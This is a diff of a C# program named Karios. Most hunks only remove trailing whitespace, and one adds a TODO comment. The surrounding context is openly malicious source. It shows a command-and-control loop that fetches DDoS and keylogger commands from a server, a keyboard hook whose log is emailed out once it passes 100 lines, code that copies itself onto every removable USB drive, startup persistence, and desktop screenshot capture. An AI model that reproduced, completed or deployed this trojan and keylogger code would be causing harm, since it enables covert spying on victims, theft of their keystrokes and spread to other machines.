@@ -53,8 +53,8 @@ namespace Karios
                 Console.ReadKey();
 
                 // Persitance feature
-                // Duplicate(); 
-                // Run on startup 
+                // Duplicate();
+                // Run on startup
                 // SetStartup();
                 // Start Application
                 // var handle = GetConsoleWindow();
@@ -95,7 +95,7 @@ namespace Karios
 
                     //Analytical: Tells server this is a new client
                     //(Will probably be implemented in a newer version)
-
+                    //TODO: Make the following if's a single switch statement
                     //Telling the server this is a new client
                     if (paramaters == "?")
                         paramaters = paramaters + "newclient=true";
@@ -167,7 +167,7 @@ namespace Karios
                     else
                         paramaters = paramaters + "&reverse=false";
 
-                    //What this is doing is setting a big string full of commands, then sends it to a server. 
+                    //What this is doing is setting a big string full of commands, then sends it to a server.
                     //The server checks if they contain certain things, then sends back infomation
                     var commands = "";
                     try
@@ -180,8 +180,8 @@ namespace Karios
 
                     var preppedCommand = commands.Split(' ');
                     // <summary>
-                    // COMMANDS : IMPORTANT : 
-                    // 0 = Online 
+                    // COMMANDS : IMPORTANT :
+                    // 0 = Online
                     // 1 = DDOSOnline
                     // 2 = DDOSIP
                     // 3 = KeyloggerOnline
@@ -203,7 +203,7 @@ namespace Karios
 
                     _emailEndpoint = preppedCommand[4];
                     _website = preppedCommand[8];
-                    //Creates a new button, then clicks it for funsies 
+                    //Creates a new button, then clicks it for funsies
                     Button b = new Button();
                     b.Click += LaunchWebsite();
                     b.PerformClick();
@@ -264,9 +264,9 @@ namespace Karios
             {
                 //ignored
             }
-            
+
             // The Reading part
-            
+
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             {
                 if (EmailSending == false)
@@ -276,7 +276,7 @@ namespace Karios
                     SendMail();
                 }
             }
-            
+
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
             // ReSharper disable once UnusedVariable
             //delete log file.
@@ -317,7 +317,7 @@ namespace Karios
             {
                 if (d.DriveType == DriveType.Removable && d.IsReady)
                 {
-                    //Checks if they are removable, then adds Karios into the USB 
+                    //Checks if they are removable, then adds Karios into the USB
                     File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName,
                         d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
                 }
@@ -406,16 +406,16 @@ namespace Karios
 
         private static Image CaptureDesktop()
         {
-            // Start the process... 
+            // Start the process...
             var memoryImage = new Bitmap(1000, 900);
             var s = new Size(memoryImage.Width, memoryImage.Height);
 
-            // Create graphics 
+            // Create graphics
             var memoryGraphics = Graphics.FromImage(memoryImage);
 
-            // Copy data from screen 
+            // Copy data from screen
             memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
-            // Save it! 
+            // Save it!
             return memoryImage;
         }
 
